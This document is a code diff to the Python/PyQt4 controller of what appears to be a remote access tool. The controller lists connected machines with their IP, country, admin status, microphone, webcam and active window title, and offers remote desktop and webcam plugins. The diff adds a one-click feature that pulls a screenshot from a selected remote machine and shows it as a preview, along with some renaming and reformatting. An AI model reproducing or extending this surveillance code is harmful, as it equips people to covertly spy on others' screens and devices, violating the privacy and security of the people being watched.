@@ -11,6 +11,7 @@ import hashlib
 import string
 import random
 import datetime
+from PIL import Image
 from threading import Thread
 
 from PyQt4.QtGui import *
@@ -36,6 +37,9 @@ from plugins.mwebcam import main as mwebcam
 geo_ip_database = pygeoip.GeoIP('assets\\GeoIP.dat')
 
 # initial assets directories
+temp = os.path.join(os.getcwd(), 'temp\\')
+if not os.path.exists(temp):
+    os.makedirs(temp)
 assets = os.path.join(os.getcwd(), 'assets\\')
 flags = os.path.join(assets, 'flags')
 
@@ -84,9 +88,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         # unlocked servers bank
         self.unlockedSockets = []
 
-        # current preview bits
-        self.current_bits = None
-
         # initial alias
         self.alias = Alias()
 
@@ -121,6 +122,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.index_of_microphone = 7
         self.index_of_webcamera = 8
         self.index_of_activeWindowTitle = 9
+
         # initialize servers table columns width
         self.serversTable.setColumnWidth(self.index_of_ipAddress, 100)
         self.serversTable.setColumnWidth(self.index_of_alias, 60)
@@ -131,12 +133,15 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.serversTable.setColumnWidth(self.index_of_lock, 100)
         self.serversTable.setColumnWidth(self.index_of_microphone, 70)
         self.serversTable.setColumnWidth(self.index_of_webcamera, 45)
+
         # servers table double click trigger
         self.serversTable.doubleClicked.connect(self.unlock_client)
         # Initializing right click menu
         self.serversTable.setContextMenuPolicy(Qt.CustomContextMenu)
         self.connect(self.serversTable, SIGNAL('customContextMenuRequested(const QPoint&)'),
                      self.server_right_click_menu)
+
+        self.serversTable.clicked.connect(self.get_preview)
 
         # Triggers
         self.actionStartListen_for_connections.triggered.connect(self.listen_start)
@@ -378,25 +383,44 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
             time.sleep(1)
 
+    def get_preview(self):
+        client = self.current_client()
+        if client:
+            try:
+                screen_dict = get(self.socks[client]['sock'], 'getScreen', 'screenshot')
+                screen_info = ast.literal_eval(screen_dict)
+                im = Image.frombuffer('RGB', (int(screen_info['width']), int(screen_info['height'])),
+                                      zlib.decompress(screen_info['screenshotbits']), 'raw', 'BGRX', 0, 1)
+                screen_bits = im.convert('RGBA')
+                screen_bits.save(os.path.join(temp, 'bg.png'), 'png')
+                self.set_bg_preview(client)
+            except SyntaxError:
+                pass
+
+    def set_bg_preview(self, client):
+        self.serversTable.setToolTip(
+            '<p align="center" style="background-color: #2c3e50;color: #c9f5f7;">%s\'s Preview<br><img src="%s" width="400"></p>' % (
+                self.socks[client]['ip_address'], os.path.join(temp, 'bg.png')))
+
     def get_desktop_preview(self):
-        server = self.current_client()
-        if server:
+        client = self.current_client()
+        if client:
             args = {
-                'sock': self.socks[server]['sock'],
-                'socket': self.socks[server]['socket'],
-                'ipAddress': self.socks[server]['ip_address'],
+                'sock': self.socks[client]['sock'],
+                'socket': self.socks[client]['socket'],
+                'ipAddress': self.socks[client]['ip_address'],
                 'assets': assets,
             }
             self.desktop_desktop_preview = mdesktop.mainPopup(args)
             self.desktop_desktop_preview.show()
 
     def get_webcam_preview(self):
-        server = self.current_client()
-        if server:
+        client = self.current_client()
+        if client:
             args = {
-                'sock': self.socks[server]['sock'],
-                'socket': self.socks[server]['socket'],
-                'ipAddress': self.socks[server]['ip_address'],
+                'sock': self.socks[client]['sock'],
+                'socket': self.socks[client]['socket'],
+                'ipAddress': self.socks[client]['ip_address'],
                 'assets': assets,
             }
             self.camera_preview_dialog = mwebcam.mainPopup(args)
@@ -436,7 +460,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
                 # add user privileges
                 try:
-                    privs_status = _('INFO_USER') if not self.streaming_socks[obj]['privileges'] == '1' else _('INFO_ADMIN')
+                    privs_status = _('INFO_USER') if not self.streaming_socks[obj]['privileges'] == '1' else _(
+                        'INFO_ADMIN')
                 except KeyError:
                     print self.streaming_socks[obj]
                 item = QTableWidgetItem()
@@ -448,7 +473,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 self.serversTable.setItem(index, self.index_of_privs, item)
 
                 # add server lock status
-                lock_status = _('INFO_LOCKED') if self.streaming_socks[obj]['protection'] == 'False' else _('INFO_UNLOCKED')
+                lock_status = _('INFO_LOCKED') if self.streaming_socks[obj]['protection'] == 'False' else _(
+                    'INFO_UNLOCKED')
                 item = QTableWidgetItem(lock_status)
                 if lock_status == _('INFO_LOCKED'):
                     item.setTextColor(QColor('#e67e22'))
@@ -589,7 +615,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         if self.serversTable.selectedItems():
 
             server_menu.addAction(QIcon(os.path.join(assets, 'add_alias.png')), _('RM_SET_ALIAS'), self.add_alias)
-            server_menu.addAction(QIcon(os.path.join(assets, 'run_as_admin.png')), _('RM_RUN_AS_ADMIN'), self.run_as_admin)
+            server_menu.addAction(QIcon(os.path.join(assets, 'run_as_admin.png')), _('RM_RUN_AS_ADMIN'),
+                                  self.run_as_admin)
             server_menu.addSeparator()
 
             if self.serversTable.item(server_index, self.index_of_lock).text() == _('INFO_UNLOCKED'):
@@ -744,8 +771,8 @@ DATE: %s/%s/%s %s:%s:%s
             log_file.write(log_value)
 
 
-#open('error.log', 'w').close()
-#sys.excepthook = handle_exception
+# open('error.log', 'w').close()
+# sys.excepthook = handle_exception
 
 # Run Application
 if __name__ == '__main__':
